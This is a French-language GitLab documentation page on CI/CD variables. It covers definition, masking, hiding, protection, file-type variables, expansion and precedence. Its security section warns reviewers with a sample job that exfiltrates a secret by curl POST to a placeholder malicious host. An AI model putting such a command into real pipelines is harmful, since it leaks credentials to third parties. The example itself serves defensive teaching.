---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see <https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments>
title: Variables CI/CD
description: "Configuration, utilisation et sécurité."
---

{{< details >}}

- Édition : Gratuite, GitLab Premium, GitLab Ultimate
- Offre : GitLab.com, GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

Les variables CI/CD sont un type de variable d'environnement. Vous pouvez les utiliser pour :

- Contrôler le comportement des jobs et des pipelines.
- Stocker des valeurs que vous souhaitez réutiliser, par exemple dans des [scripts de job](job_scripts.md).
- Éviter de coder en dur des valeurs dans votre fichier `.gitlab-ci.yml`.

Les noms de variables sont limités par le [shell utilisé par le runner](https://docs.gitlab.com/runner/shells/) pour exécuter les scripts. Chaque shell possède son propre ensemble de noms de variables réservés.

Pour garantir un comportement cohérent, vous devez toujours placer les valeurs de variables entre guillemets simples ou doubles. Les variables sont analysées en interne par le [parseur YAML Psych](https://docs.ruby-lang.org/en/master/Psych.html), de sorte que les variables entre guillemets et sans guillemets peuvent être analysées différemment. Par exemple :

- `VAR1: 012345` est interprété comme une valeur octale, la valeur devient donc `5349`.
- `VAR1: "012345"` est analysé comme une chaîne avec une valeur de `012345`.
- `VAR1: 019` est analysé comme la chaîne `"019"` et non comme un octal, car `9` n'est pas un chiffre octal valide. L'analyse octale s'applique uniquement lorsque tous les chiffres sont compris entre 0 et 7.

Pour plus d'informations sur l'utilisation avancée de GitLab CI/CD, consultez [7 astuces avancées de workflow GitLab CI](https://about.gitlab.com/webcast/7cicd-hacks/) partagées par les ingénieurs GitLab.

## Variables CI/CD prédéfinies {#predefined-cicd-variables}

GitLab CI/CD met à disposition un ensemble de [variables CI/CD prédéfinies](predefined_variables.md) pour une utilisation dans la configuration des pipelines et les scripts de job. Ces variables contiennent des informations sur le job, le pipeline et d'autres valeurs dont vous pourriez avoir besoin lorsque le pipeline est déclenché ou en cours d'exécution.

Vous pouvez utiliser des variables CI/CD prédéfinies dans votre `.gitlab-ci.yml` sans les déclarer au préalable. Par exemple :

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

Le script de cet exemple produit `The job's stage is 'test'`.

## Définir une variable CI/CD dans le fichier `.gitlab-ci.yml` {#define-a-cicd-variable-in-the-gitlab-ciyml-file}

Pour créer une variable CI/CD dans le fichier `.gitlab-ci.yml`, définissez la variable et la valeur avec le mot-clé [`variables`](../yaml/_index.md#variables).

Les variables enregistrées dans le fichier `.gitlab-ci.yml` sont visibles par tous les utilisateurs ayant accès au dépôt et ne doivent stocker que la configuration de projet non sensible. Par exemple, l'URL d'une base de données enregistrée dans une variable `DATABASE_URL`. Les variables sensibles contenant des valeurs telles que des secrets ou des clés doivent être ajoutées dans l'interface utilisateur.

Vous pouvez définir `variables` dans :

- Un job : La variable n'est disponible que dans les sections `script`, `before_script` ou `after_script` de ce job, et avec certains [mots-clés de job](../yaml/_index.md#job-keywords).
- Au niveau supérieur du fichier `.gitlab-ci.yml` : La variable est disponible par défaut pour tous les jobs d'un pipeline, à moins qu'un job ne définisse une variable portant le même nom. La variable du job a la priorité.

Dans les deux cas, vous ne pouvez pas utiliser ces variables avec les [mots-clés globaux](../yaml/_index.md#global-keywords).

Par exemple :

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

Dans cet exemple :

- `job1` génère : `Variables are 'A default variable' and 'Job 1 variable'`
- `job2` génère : `Variables are 'Different value than default', 'Job 2 variable', and ''`

Utilisez les mots-clés `value` et `description` pour définir des [variables pré-remplies](../pipelines/_index.md#prefill-variables-in-manual-pipelines) pour les pipelines déclenchés manuellement.

### Ignorer les variables par défaut dans un seul job {#skip-default-variables-in-a-single-job}

Si vous ne souhaitez pas que les variables par défaut soient disponibles dans un job, définissez `variables` sur `{}` :

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## Définir une variable CI/CD dans l'interface utilisateur {#define-a-cicd-variable-in-the-ui}

Les variables sensibles telles que les jetons ou les mots de passe doivent être stockées dans les paramètres de l'interface utilisateur, et non dans le fichier `.gitlab-ci.yml`.

Par défaut, les pipelines provenant de projets dupliqués ne peuvent pas accéder aux variables CI/CD disponibles pour le projet parent. Si vous [exécutez un pipeline de merge request dans le projet parent pour un merge request issu d'une duplication](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project), toutes les variables deviennent disponibles pour le pipeline.

### Pour un projet {#for-a-project}

{{< history >}}

- La visibilité par défaut a été [modifiée](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494) de **Visible** à **Masquée** dans GitLab 18.3.

{{< /history >}}

Vous pouvez ajouter des variables CI/CD aux paramètres d'un projet. Les projets peuvent avoir un maximum de 8 000 variables CI/CD.

Prérequis :

- Vous devez être membre du projet avec le rôle Maintainer.

Pour ajouter ou mettre à jour des variables dans les paramètres du projet :

1. Dans la barre supérieure, sélectionnez **Rechercher ou aller à** et trouvez votre projet.
1. Dans la barre latérale gauche, sélectionnez **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. Sélectionnez **Ajouter une variable** et renseignez les détails :
   - **Clé** : Doit être sur une seule ligne, sans espaces, en utilisant uniquement des lettres, des chiffres ou `_`.
   - **Valeur** : La valeur est limitée à 10 000 caractères, mais également bornée par les limites du système d'exploitation du runner. La valeur a des limitations supplémentaires si **Visibilité** est définie sur **Masquée** ou **Masquée et cachée**.
   - **Type** : `Variable` (par défaut) ou [`File`](#use-file-type-cicd-variables).
   - **Portée de l'environnement** : Facultatif. **Tous (par défaut)** (`*`), un [environnement](../environments/_index.md) spécifique ou une portée d'environnement avec caractère générique.
   - **Protéger la variable** Facultatif. Si elle est sélectionnée, la variable n'est disponible que dans les pipelines qui s'exécutent sur des branches protégées ou des tags protégés.
   - **Visibilité** : Sélectionnez **Visible**, **Masquée** (par défaut) ou **Masquée et cachée**.
   - **Développer la référence de la variable** : Facultatif. Si elle est sélectionnée, la variable peut faire référence à une autre variable. Il n'est pas possible de référencer une autre variable si **Visibilité** est définie sur **Masquée** ou **Masquée et cachée**.

Les variables de projet peuvent également être ajoutées [en utilisant l'API](../../api/project_level_variables.md).

### Pour un groupe {#for-a-group}

{{< history >}}

- La visibilité par défaut a été [modifiée](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494) de **Visible** à **Masquée** dans GitLab 18.3.

{{< /history >}}

Vous pouvez rendre une variable CI/CD disponible pour tous les projets d'un groupe. Les groupes peuvent avoir un maximum de 30 000 variables CI/CD.

Prérequis :

- Vous devez être membre du groupe avec le rôle Owner.

Pour ajouter une variable de groupe :

1. Dans la barre supérieure, sélectionnez **Rechercher ou aller à** et trouvez votre groupe.
1. Dans la barre latérale gauche, sélectionnez **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. Sélectionnez **Ajouter une variable** et renseignez les détails :
   - **Clé** : Doit être sur une seule ligne, sans espaces, en utilisant uniquement des lettres, des chiffres ou `_`.
   - **Valeur** : La valeur est limitée à 10 000 caractères, mais également bornée par les limites du système d'exploitation du runner. La valeur a des limitations supplémentaires si **Visibilité** est définie sur **Masquée** ou **Masquée et cachée**.
   - **Type** : `Variable` (par défaut) ou [`File`](#use-file-type-cicd-variables).
   - **Protéger la variable** Facultatif. Si elle est sélectionnée, la variable n'est disponible que dans les pipelines qui s'exécutent sur des branches protégées ou des tags protégés.
   - **Visibilité** : Sélectionnez **Visible**, **Masquée** (par défaut), **Masquée et cachée**.
   - **Développer la référence de la variable** : Facultatif. Si elle est sélectionnée, la variable peut faire référence à une autre variable. Il n'est pas possible de référencer une autre variable si **Visibilité** est définie sur **Masquée** ou **Masquée et cachée**.

Les variables de groupe disponibles dans un projet sont répertoriées dans la section **Paramètres** > **CI/CD** > **Variables** du projet. Les variables des sous-groupes sont héritées de manière récursive.

Les variables de groupe peuvent également être ajoutées [en utilisant l'API](../../api/group_level_variables.md).

#### Portée de l'environnement {#environment-scope}

{{< details >}}

- Édition : GitLab Premium, GitLab Ultimate

{{< /details >}}

Pour configurer une variable CI/CD de groupe afin qu'elle ne soit disponible que pour certains environnements :

1. Dans la barre supérieure, sélectionnez **Rechercher ou aller à** et trouvez votre groupe.
1. Dans la barre latérale gauche, sélectionnez **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. À droite de la variable, sélectionnez **Éditer** ({{< icon name="pencil" >}}).
1. Pour **Portée de l'environnement**, sélectionnez **Tous (par défaut)** (`*`), un [environnement](../environments/_index.md) spécifique ou une portée d'environnement avec caractère générique.

### Pour une instance {#for-an-instance}

{{< details >}}

- Édition : Gratuite, GitLab Premium, GitLab Ultimate
- Offre : GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

{{< history >}}

- La visibilité par défaut a été [modifiée](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494) de **Visible** à **Masquée** dans GitLab 18.3.
- L'option **Masquée et cachée** a été [introduite](https://gitlab.com/gitlab-org/gitlab/-/issues/592708) dans GitLab 19.0.

{{< /history >}}

Vous pouvez rendre une variable CI/CD disponible pour tous les projets et groupes d'une instance GitLab.

Prérequis :

- Vous devez disposer d'un accès administrateur à l'instance.

Pour ajouter une variable d'instance :

1. Dans le coin supérieur droit, sélectionnez **Admin**.
1. Dans la barre latérale gauche, sélectionnez **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. Sélectionnez **Ajouter une variable** et renseignez les détails :
   - **Clé** : Doit être sur une seule ligne, sans espaces, en utilisant uniquement des lettres, des chiffres ou `_`.
   - **Valeur** : La valeur est limitée à 10 000 caractères, mais également bornée par les limites du système d'exploitation du runner. Aucune autre limitation si **Visibilité** est définie sur **Visible**.
   - **Type** : `Variable` (par défaut) ou `File`.
   - **Protéger la variable** Facultatif. Si elle est sélectionnée, la variable n'est disponible que dans les pipelines qui s'exécutent sur des branches ou des tags protégés.
   - **Visibilité** : Sélectionnez **Visible**, **Masquée** (par défaut) ou **Masquée et cachée**.
   - **Développer la référence de la variable** : Facultatif. Si elle est sélectionnée, la variable peut faire référence à une autre variable. Il n'est pas possible de référencer une autre variable si **Visibilité** est définie sur **Masquée** ou **Masquée et cachée**.

Les variables d'instance peuvent également être ajoutées [en utilisant l'API](../../api/instance_level_ci_variables.md).

## Sécurité des variables CI/CD {#cicd-variable-security}

Le code poussé vers le fichier `.gitlab-ci.yml` pourrait compromettre vos variables. Les variables pourraient être exposées accidentellement dans un job log, ou envoyées de manière malveillante à un serveur tiers.

Passez en revue tous les merge requests qui introduisent des modifications dans le fichier `.gitlab-ci.yml` avant de :

- [Exécuter un pipeline dans le projet parent pour un merge request soumis depuis un projet dupliqué](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project).
- Fusionner les modifications.

Passez en revue le fichier `.gitlab-ci.yml` des projets importés avant d'ajouter des fichiers ou d'exécuter des pipelines contre eux.

L'exemple suivant illustre du code malveillant dans un fichier `.gitlab-ci.yml` :

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

Pour réduire le risque de fuite accidentelle de secrets via des scripts comme dans `accidental-leak-job`, toutes les variables contenant des informations sensibles doivent toujours être masquées dans les job logs. Vous pouvez également [limiter une variable aux branches et tags protégés uniquement](#protect-a-cicd-variable).

Vous pouvez également [vous connecter à un fournisseur externe de gestion des secrets](../secrets/_index.md) pour stocker et récupérer des secrets.

Les scripts malveillants comme dans `malicious-job` doivent être détectés lors du processus de révision. Les relecteurs ne doivent jamais déclencher un pipeline lorsqu'ils trouvent du code de ce type, car du code malveillant peut compromettre à la fois les variables masquées et les variables protégées.

Les valeurs des variables sont chiffrées à l'aide de [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) et stockées dans la base de données. Ces données peuvent être lues et déchiffrées avec un [fichier de secrets](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost) valide.

### Masquer une variable CI/CD {#mask-a-cicd-variable}

> [!warning]
> Masquer une variable CI/CD n'est pas un moyen garanti d'empêcher les utilisateurs malveillants d'accéder aux valeurs des variables. Pour garantir la sécurité des informations sensibles, envisagez d'utiliser des [secrets externes](../secrets/_index.md) et des [variables de type fichier](#use-file-type-cicd-variables) pour empêcher des commandes telles que `env` ou `printenv` d'afficher les variables secrètes.

Vous pouvez masquer une variable CI/CD pour un projet, un groupe ou une instance afin d'éviter que sa valeur n'apparaisse dans les job logs. Lorsqu'un job génère la valeur d'une variable masquée, la valeur est remplacée par `[MASKED]` dans le job log. Dans certains cas, la valeur `[MASKED]` peut également être suivie de caractères `x`.

Prérequis :

- Vous devez disposer du même rôle ou niveau d'accès que celui requis pour [ajouter une variable CI/CD dans l'interface utilisateur](#define-a-cicd-variable-in-the-ui).

Pour masquer une variable :

1. Pour le groupe, le projet ou dans la zone **Admin**, sélectionnez **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. À côté de la variable que vous souhaitez protéger, sélectionnez **Éditer**.
1. Sous **Visibilité**, sélectionnez **Masquer la variable**.
1. Recommandé. Décochez la case [**Développer la référence de la variable**](#allow-cicd-variable-expansion). Si l'expansion des variables est activée, les seuls caractères non alphanumériques que vous pouvez utiliser dans la valeur de la variable sont : `_`, `:`, `@`, `-`, `+`, `.`, `~`, `=`, `/` et `~`. Lorsque le paramètre est désactivé, tous les caractères peuvent être utilisés.
1. Sélectionnez **Mettre une variable à jour**.

La valeur de la variable doit :

- Être sur une seule ligne sans espaces.
- Comporter 8 caractères ou plus.
- Ne pas correspondre au nom d'une variable CI/CD prédéfinie ou personnalisée existante.

Si un processus génère la valeur de manière légèrement modifiée, la valeur ne peut pas être masquée. Par exemple, si le shell ajoute ` \ ` pour échapper les caractères spéciaux, la valeur n'est pas masquée :

- Exemple de valeur de variable masquée : `My[value]`
- Cette sortie ne serait pas masquée : `My\[value\]`

Lorsque `CI_DEBUG_SERVICES` est activé, la valeur de la variable pourrait être révélée. Pour plus d'informations, consultez [la journalisation des conteneurs de service](../services/_index.md#capturing-service-container-logs).

### Cacher une variable CI/CD {#hide-a-cicd-variable}

{{< history >}}

- [Introduit](https://gitlab.com/gitlab-org/gitlab/-/issues/29674) dans GitLab 17.4 [avec un indicateur](../../administration/feature_flags/_index.md) nommé `ci_hidden_variables`. Activé par défaut.
- [Généralement disponible](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843) dans GitLab 17.6. Le feature flag `ci_hidden_variables` a été supprimé.

{{< /history >}}

En plus du masquage, vous pouvez également empêcher la valeur des variables CI/CD d'être révélée dans la page des paramètres **CI/CD**. Cacher une variable n'est possible que lors de la création d'une nouvelle variable ; vous ne pouvez pas mettre à jour une variable existante pour la cacher.

Prérequis :

- Vous devez disposer du même rôle ou niveau d'accès que celui requis pour [ajouter une variable CI/CD dans l'interface utilisateur](#define-a-cicd-variable-in-the-ui).
- La valeur de la variable doit correspondre aux [exigences pour les variables masquées](#mask-a-cicd-variable).

Pour cacher une variable, sélectionnez **Masquée et cachée** dans la section **Visibilité** lorsque vous [ajoutez une nouvelle variable CI/CD dans l'interface utilisateur](#define-a-cicd-variable-in-the-ui). Une fois la variable enregistrée, elle peut être utilisée dans les pipelines CI/CD, mais ne peut plus être révélée dans l'interface utilisateur.

### Protéger une variable CI/CD {#protect-a-cicd-variable}

Vous pouvez configurer une variable CI/CD de projet, de groupe ou d'instance pour qu'elle ne soit disponible que pour les pipelines qui s'exécutent sur des [branches protégées](../../user/project/repository/branches/protected.md) ou des [tags protégés](../../user/project/protected_tags.md).

Les pipelines de résultats fusionnés et les pipelines de merge request peuvent [éventuellement accéder aux variables protégées](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners).

Prérequis :

- Vous devez disposer du même rôle ou niveau d'accès que celui requis pour [ajouter une variable CI/CD dans l'interface utilisateur](#define-a-cicd-variable-in-the-ui).

Pour définir une variable comme protégée :

1. Pour le projet ou le groupe, accédez à **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. À côté de la variable que vous souhaitez protéger, sélectionnez **Éditer**.
1. Cochez la case **Protéger la variable**.
1. Sélectionnez **Mettre une variable à jour**.

La variable est disponible pour tous les pipelines suivants.

### Utiliser des variables CI/CD de type fichier {#use-file-type-cicd-variables}

Toutes les variables CI/CD prédéfinies et les variables définies dans le fichier `.gitlab-ci.yml` sont de type « variable » ([`"variable_type": "env_var"` dans l'API](../../api/project_level_variables.md)).

Les variables de type variable :

- Se composent d'une paire clé-valeur.
- Sont mises à disposition dans les jobs en tant que variables d'environnement, avec :
  - La clé de la variable CI/CD comme nom de la variable d'environnement.
  - La valeur de la variable CI/CD comme valeur de la variable d'environnement.

Les variables CI/CD de projet, de groupe et d'instance sont de type « variable » par défaut, mais peuvent éventuellement être définies comme type « fichier » (`"variable_type": "file"` dans l'API). Les variables de type fichier :

- Se composent d'une clé, d'une valeur et d'un fichier.
- Sont mises à disposition dans les jobs en tant que variables d'environnement, avec :
  - La clé de la variable CI/CD comme nom de la variable d'environnement.
  - La valeur de la variable CI/CD enregistrée dans un fichier temporaire.
  - Le chemin vers le fichier temporaire comme valeur de variable d'environnement.

Utilisez des variables CI/CD de type fichier pour les outils qui nécessitent un fichier en entrée.

Par exemple, l'AWS CLI et `kubectl` sont deux outils qui utilisent des variables de type `File` pour la configuration. Si vous utilisez `kubectl` avec :

- Une variable avec une clé `KUBE_URL` et `https://example.com` comme valeur.
- Une variable de type fichier avec une clé `KUBE_CA_PEM` et un certificat comme valeur.

Passez `KUBE_URL` comme option `--server`, qui accepte une variable, et passez `$KUBE_CA_PEM` comme option `--certificate-authority`, qui accepte un chemin vers un fichier :

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

#### Utiliser une variable `.gitlab-ci.yml` comme variable de type fichier {#use-a-gitlab-ciyml-variable-as-a-file-type-variable}

Vous ne pouvez pas définir une variable CI/CD [définie dans le fichier `.gitlab-ci.yml`](#define-a-cicd-variable-in-the-gitlab-ciyml-file) comme variable de type fichier. Si vous disposez d'un outil qui requiert un chemin de fichier en entrée, mais que vous souhaitez utiliser une variable définie dans le `.gitlab-ci.yml` :

- Exécutez une commande qui enregistre la valeur de la variable dans un fichier.
- Utilisez ce fichier avec votre outil.

Par exemple :

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## Autoriser l'expansion des variables CI/CD {#allow-cicd-variable-expansion}

{{< history >}}

- L'option **Développer la variable** est [désactivée](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144) par défaut dans GitLab 18.6.

{{< /history >}}

Vous pouvez configurer une variable pour traiter les valeurs contenant le caractère `$` comme une référence à une autre variable. Lorsque le pipeline s'exécute, la référence est développée pour utiliser la valeur de la variable référencée.

Les variables CI/CD définies dans l'interface utilisateur ne sont pas développées par défaut. Pour les variables CI/CD définies dans le fichier `.gitlab-ci.yml`, contrôlez l'expansion des variables avec le [mot-clé `variables:expand`](../yaml/_index.md#variablesexpand).

Prérequis :

- Vous devez disposer du même rôle ou niveau d'accès que celui requis pour [ajouter une variable CI/CD dans l'interface utilisateur](#define-a-cicd-variable-in-the-ui).

Pour activer l'expansion de variable pour la variable :

1. Pour le projet ou le groupe, accédez à **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. À côté de la variable que vous ne souhaitez pas développer, sélectionnez **Éditer**.
1. Cochez la case **Développer la référence de la variable**.
1. Sélectionnez **Mettre une variable à jour**.

> [!note]
> Ne [masquez](#mask-a-cicd-variable) pas une valeur de variable si vous souhaitez utiliser l'expansion de variable. Si le masquage et l'expansion des variables sont combinés, les limitations de caractères empêchent l'utilisation de `$` pour référencer d'autres variables.

## Priorité des variables CI/CD {#cicd-variable-precedence}

Vous pouvez utiliser des variables CI/CD portant le même nom à différents endroits, mais les valeurs peuvent se remplacer mutuellement. Le type de variable et l'endroit où elles sont définies déterminent quelles variables ont la priorité.

L'ordre de priorité des variables est (de la plus haute à la plus basse) :

1. [Variables de politique d'exécution de pipeline](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables).
1. [Variables de politique d'exécution de scan](../../user/application_security/policies/scan_execution_policies.md).
1. [Variables de pipeline](#use-pipeline-variables). Ces variables ont toutes la même priorité :
   - Variables transmises aux pipelines downstream.
   - Variables de déclencheur.
   - Variables de pipeline planifié.
   - Variables de pipeline manuel.
   - Variables ajoutées lors de la création d'un pipeline avec l'API.
   - Variables de job manuel.
1. Variables de projet.
1. Variables de groupe. Si le même nom de variable existe dans un groupe et ses sous-groupes, le job utilise la valeur du sous-groupe le plus proche. Par exemple, si vous avez `Group > Subgroup 1 > Subgroup 2 > Project`, la variable définie dans `Subgroup 2` a la priorité.
1. Variables d'instance.
1. [Variables issues des rapports `dotenv`](dotenv_variables.md#pass-variables-to-later-jobs).
1. Variables de job, définies dans les jobs du fichier `.gitlab-ci.yml`.
1. Variables par défaut pour tous les jobs, définies au niveau supérieur du fichier `.gitlab-ci.yml`.
1. [Variables de déploiement](predefined_variables.md#deployment-variables).
1. [Variables prédéfinies](predefined_variables.md).

Par exemple :

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

Dans cet exemple, `job1` génère `The variable is 'secure'` car les variables définies dans les jobs du fichier `.gitlab-ci.yml` ont une priorité plus élevée que les variables par défaut.

## Utiliser des variables de pipeline {#use-pipeline-variables}

Les variables de pipeline sont des variables spécifiées lors de l'exécution d'un nouveau pipeline.

> [!note]
> Dans [GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables) et les versions ultérieures, les [entrées de pipeline](../inputs/_index.md#for-a-pipeline) sont recommandées plutôt que la transmission de variables de pipeline. Pour une sécurité renforcée, vous devriez [désactiver les variables de pipeline](#restrict-pipeline-variables) lors de l'utilisation d'entrées.

Prérequis :

- Vous devez disposer du rôle Developer dans le projet.

Vous pouvez spécifier une variable de pipeline lorsque vous :

- [Exécutez un pipeline manuellement](../jobs/job_control.md#specify-variables-when-running-manual-jobs) dans l'interface utilisateur.
- Créez un [pipeline planifié](../pipelines/schedules.md#create-a-pipeline-schedule).
- Créez un pipeline en utilisant [le point de terminaison API `pipelines`](../../api/pipelines.md#create-a-new-pipeline).
- Créez un pipeline en utilisant [le point de terminaison API `triggers`](../triggers/_index.md#pass-cicd-variables-in-the-api-call).
- Utilisez les [options de push](../../topics/git/commit.md#push-options-for-gitlab-cicd).
- Transmettez des variables à un pipeline downstream en utilisant le [mot-clé `variables`](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline), le [mot-clé `trigger:forward`](../yaml/_index.md#triggerforward) ou les [variables `dotenv`](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job).

Ces variables ont une priorité plus élevée et peuvent remplacer d'autres variables définies, y compris les variables prédéfinies.

> [!warning]
> Vous devriez éviter de remplacer les variables prédéfinies dans la plupart des cas, car cela peut entraîner un comportement inattendu du pipeline.

### Restreindre les variables de pipeline {#restrict-pipeline-variables}

{{< history >}}

- [Introduit](https://gitlab.com/gitlab-org/gitlab/-/issues/440338) dans GitLab 17.1.
- Pour GitLab.com, les valeurs par défaut des paramètres ont été [mises à jour pour tous les nouveaux projets dans les nouveaux espaces de nommage](https://gitlab.com/gitlab-org/gitlab/-/issues/502382) à `no_one_allowed` pour `ci_pipeline_variables_minimum_override_role` dans GitLab 17.7.

{{< /history >}}

Vous pouvez limiter les utilisateurs autorisés à exécuter des pipelines avec des variables de pipeline à des rôles utilisateur spécifiques. Lorsque des utilisateurs disposant d'un rôle inférieur tentent d'utiliser des variables de pipeline, ils reçoivent un message d'erreur `Insufficient permissions to set pipeline variables`.

Prérequis :

- Vous devez disposer du rôle Maintainer dans le projet. Si le rôle minimum a été précédemment défini sur `owner` ou `no_one_allowed`, vous devez alors disposer du rôle Owner dans le projet.

Pour limiter l'utilisation des variables de pipeline au seul rôle Maintainer et aux rôles supérieurs :

- Accédez à **Paramètres** > **CI/CD** > **Variables**.
- Sous **Rôle minimum autorisé à utiliser les variables de pipeline**, sélectionnez l'une des options suivantes :
  - `no_one_allowed` : Aucun pipeline ne peut s'exécuter avec des variables de pipeline. Valeur par défaut pour les nouveaux projets dans les nouveaux espaces de nommage sur GitLab.com. Une fois le paramètre à cette valeur, seul le rôle Owner peut le modifier.
  - `owner` : Seuls les utilisateurs disposant du rôle Owner peuvent exécuter des pipelines avec des variables de pipeline. Une fois le paramètre à cette valeur, seul le rôle Owner peut le modifier.
  - `maintainer` : Seuls les utilisateurs disposant du rôle Maintainer ou Owner peuvent exécuter des pipelines avec des variables de pipeline. Valeur par défaut si non spécifié sur GitLab Self-Managed et GitLab Dedicated.
  - `developer` : Seuls les utilisateurs disposant du rôle Developer, Maintainer ou Owner peuvent exécuter des pipelines avec des variables de pipeline.

Vous pouvez également utiliser [l'API des projets](../../api/projects.md#update-a-project) pour définir le rôle pour le paramètre `ci_pipeline_variables_minimum_override_role`.

Cette restriction n'affecte pas l'utilisation des variables CI/CD provenant des paramètres du projet ou du groupe. La plupart des jobs peuvent toujours utiliser le mot-clé `variables` dans la configuration YAML, mais pas les jobs qui utilisent le mot-clé `trigger` pour déclencher des pipelines downstream. Les jobs de déclencheur transmettent des variables aux pipelines downstream en tant que variables de pipeline, ce qui est également contrôlé par ce paramètre.

#### Activer la restriction des variables de pipeline pour plusieurs projets {#enable-pipeline-variable-restriction-for-multiple-projects}

{{< history >}}

- [Introduit](https://gitlab.com/gitlab-org/gitlab/-/issues/514242) dans GitLab 18.4.

{{< /history >}}

Pour les groupes comportant de nombreux projets, vous pouvez désactiver les variables de pipeline dans tous les projets qui ne les utilisent pas actuellement. Cette option définit le paramètre **Rôle minimum autorisé à utiliser les variables de pipeline** sur `no_one_allowed` pour les projets qui n'ont jamais utilisé de variables de pipeline.

Prérequis :

- Vous devez avoir le rôle Propriétaire pour le groupe.

Pour activer le paramètre de restriction des variables de pipeline dans les projets du groupe :

1. Dans la barre supérieure, sélectionnez **Rechercher ou aller à** et trouvez votre groupe.
1. Dans la barre latérale gauche, sélectionnez **Paramètres** > **CI/CD**.
1. Développez **Variables**.
1. Dans la section **Désactiver les variables de pipeline dans les projets qui ne les utilisent pas**, sélectionnez **Démarrer la migration**.

La migration s'exécute en arrière-plan. Vous recevez une notification par e-mail lorsque la migration est terminée. Les mainteneurs de projet peuvent modifier ultérieurement le paramètre pour leurs projets individuels si nécessaire.

## Exporter des variables {#exporting-variables}

Les scripts exécutés dans des contextes shell distincts ne partagent pas les exportations, les alias, les définitions de fonctions locales ni aucune autre mise à jour locale du shell.

Cela signifie que si un job échoue, les variables créées par les scripts définis par l'utilisateur ne sont pas exportées.

Lorsque les runners exécutent des jobs définis dans `.gitlab-ci.yml` :

- Les scripts spécifiés dans `before_script` et le script principal sont exécutés ensemble dans un seul contexte shell et sont concaténés.
- Les scripts spécifiés dans `after_script` s'exécutent dans un contexte shell complètement séparé de `before_script` et des scripts spécifiés.

Quel que soit le shell dans lequel les scripts sont exécutés, la sortie du runner inclut :

- Les variables prédéfinies.
- Les variables définies dans :
  - Les paramètres CI/CD de l'instance, du groupe ou du projet.
  - Le fichier `.gitlab-ci.yml` dans la section `variables:`.
  - Le fichier `.gitlab-ci.yml` dans la section `secrets:`.
  - Le fichier `config.toml`.

Le runner ne peut pas gérer les exportations manuelles, les alias shell et les fonctions exécutées dans le corps du script, comme `export MY_VARIABLE=1`.

Par exemple, dans le fichier `.gitlab-ci.yml` suivant, les scripts suivants sont définis :

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

Lorsque le runner exécute le job :

1. `before_script` est exécuté :
   1. Affiche la sortie.
   1. Définit la variable pour `MY_VARIABLE`.
1. `script` est exécuté :
   1. Affiche la sortie.
   1. Affiche la valeur de `JOB_DEFINED_VARIABLE`.
   1. Affiche la valeur de `CI_COMMIT_SHA`.
   1. Affiche la valeur de `MY_VARIABLE`.
1. `after_script` est exécuté dans un nouveau contexte shell distinct :
   1. Affiche la sortie.
   1. Affiche la valeur de `JOB_DEFINED_VARIABLE`.
   1. Affiche la valeur de `CI_COMMIT_SHA`.
   1. Affiche une valeur vide de `MY_VARIABLE`. La valeur de la variable ne peut pas être détectée car `after_script` est dans un contexte shell distinct de `before_script`.

## Sujets connexes {#related-topics}

